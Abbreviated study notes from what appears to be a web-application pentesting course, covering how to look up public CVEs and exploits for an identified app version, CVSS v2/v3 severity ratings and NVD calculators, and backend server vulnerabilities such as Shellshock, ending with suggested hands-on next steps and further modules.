The most critical backend component vulns are those that can be atk'd externally and can be leveraged to take ctrl o/ the backend server w/o needing local access to that server (i.e. external pentesting). These vulns are usually caused by coding mistakes made during the dev't of a web app's backend components. So, there is a wide variety of vuln types in this area, ranging from basic vulns that can be exploited w relative ease to sophisticated vulns req'g deep knowledge of the entire web app.
### Public CVE
As many orgs deploy web apps that are publicly used, like open-source and proprietary web apps, these web apps tend to be tested by many orgs and experts around the world. This leads to freq'ly uncovering a large number of vuln, most of which get patched and then shared publicly and assigned a [Common Vulnerabilities and Exposure (CVE)](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures) record and score.

Many pentesters also make proof of concept exploits to test whether a certain public vuln can be exploited and usually make these exploits avail for public user, for testing and ed purposes. This makes searching for public exploits the v first step when pentesting web apps.
> [!Tip]
> The first step is to id the ver of the web app. This can be found in many locations, like the source code of the web app. For open source web apps, check the repo of the web app and id where the ver num is shown (e.g. in `version.php` pg), and then check the same pg on the target web app to confirm.

Once the web app ver is id'd, search Google for public exploits for this ver of the web app. An online exploit db can also be used ( like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/)).

Usually, the best exploits of interest have a CVE score of 8-10 or exploits that lead to `Remote Code Execution`. Other types of public exploits should also be considered of none of the above is avail.

Furthermore, these vulns are not exclusive to web apps and apply to components util'd be the web app. If a web app uses external components (e.g. a plugin), search for vulns for these external components as well.
### Common Vulnerability Scoring System (CVSS)
The [Common Vulnerability Scoring System (CVSS)](https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System) is an open-source industry std for assessing the severity of sec vulns. This scoring sys is often used as a std measurement for orgs and govs that need to produce accurate and consistent severity scores for their sys' vulns. This helps w the prioritization of resources and the response to a given threat.

CVSS scores are based on a formula that uses several metrics: `Base`, `Temporal`, and `Environmental`. When calc'g the severity of a vuln using CVSS, the `Base` metrics produce a score ranging from 0-10, modded by applying `Temporal` and `Environmental` metrics. The [National Vulnerability Database (NVD)](https://nvd.nist.gov/) provides CVSS scores for almost all known, publicly disclosed vulns. At this time, the NVD only provides `Base` scores based upon a given vuln's inherent chars. The current scoring sys's in in place are CVSS v2 and CVSS v3. There are several dif's b/w the v2 and v2 sys's, namely changes to the `Base` and `Environmental` groups to acct for additional metrics. More info about the difs b/w the two scoring sys's can be found [here](https://www.balbix.com/insights/cvss-v2-vs-cvss-v3).

CVSS scoring ratings differ slightly b/w v2 and v3 as can be seen in the following tbls:

| **CVSS V2.0 Ratings** |                      |
| --------------------- | -------------------- |
| **Severity**          | **Base Score Range** |
| Low                   | 0.0-3.9              |
| Medium                | 4.0-6.9              |
| High                  | 7.0-10.0             |

|**CVSS V3.0 Ratings**|
|---|---|
|**Severity**|**Base Score Range**|
|None|0.0|
|Low|0.1-3.9|
|Medium|4.0-6.9|
|High|7.0-8.9|
|Critical|9.0-10.0|
The NVD does not factor in `Temporal` and `Environmental` metrics b/c the former can change o/ time dur to external events. The latter is a customized metric based on the potential impact of the vuln on a given org. The NVD provides a [CVSS v2 calculator](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator) and a [CVSS v3 calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) that orgs can use to factor additional risk from `Temporal` and `Environmental` data unique to them. The calcs are v interactive and can be used to fine-tune the CVSS score to our env. Move o/ each metric to read more about it and determine exactly how it applies to the org.

>[!Excercise]
>Play around w the CVSS calc and see how the various metrics can be adjusted to arrive at a given score.
>Review some CVEs and attempt to arrive at the same CVSS score.
>How does the CVSS score change when you apply `Temporal` and `Envirnmental` metrics?
>[This handy guide](https://www.first.org/cvss/user-guide) is extremely useful for understanding v2 and v3 and how to use the calcs to arrive at a given score.
### Backend Server Vulnerabilities
Like public vulns for web apps, consider also looking for vulns for other backend components, like the backend server or the web server.

The most critical vulns for backend components are found in web servers, as they are publicly accessible o/ `TCP`. An example of a well-known web server vuln is the `Shell-Shock`, which affected Apache web servers released during and b4 2014 and util'd `HTTP` requests to gain remote ctrl o/ the backend server.

As for vulns in the backend server or the db, they are usually util'd after gaining local access to the backend server or backend network, which may be gained through `external` vulns or during internal pentesting. They are usually used to gain high priv access on the backend server/network or gain ctrl o/ other servers w/i the same network.

Although not directly exploitable externally, these vulns are still critical and need to be patched to prot the entire web app from being compromised.
# Next Steps
This module demonstrated some, but by no means all, web app basics and taught the fundamentals of how a web app is built, how it works, and what dangers it can introduce into  a corporate env.

It is important to take a hands-on approach to further develop an understanding and apply the topics taught in this module. It is recommended to review the material in combo w dev'g a small web app. Some next steps that can be taken are:

| **Step** | **To-Do**                                                               |
| -------- | ----------------------------------------------------------------------- |
| `1.`     | Set up a VM with a web server                                           |
| `2.`     | Create an `HTML` page                                                   |
| `3.`     | Design it with `CSS`                                                    |
| `4.`     | Add some simple functions with `JavaScript`                             |
| `5.`     | Program a simple web application                                        |
| `6.`     | Connect your web application to the database                            |
| `7.`     | Experiment with APIs                                                    |
| `8.`     | Test your application for various vulnerabilities and security holes    |
| `9.`     | Try to adjust your code and configurations to close the vulnerabilities |
Dev'g a small web app will provide a much deeper understanding of the structure and fn'y. Learning how to set up and mng such a web server, the db's role, and how the individual pieces of code are linked together is in invaluable experience.

The `Web Requests` and `JavaScript Deobfuscation` Academy modules will help build on the knowledge presented in this module.

The module `Hacking WordPress` and other similar modules related to `OWASP Top 10` (such as `SQL Injection Fundamentals`) are a great next step to get into pentesting web apps and learn more about web app vulns and exploitation. Finally, to apply what is taught in these modules, jump into atk'g some `Easy` boxes on [HackTheBox](https://www.hackthebox.eu/).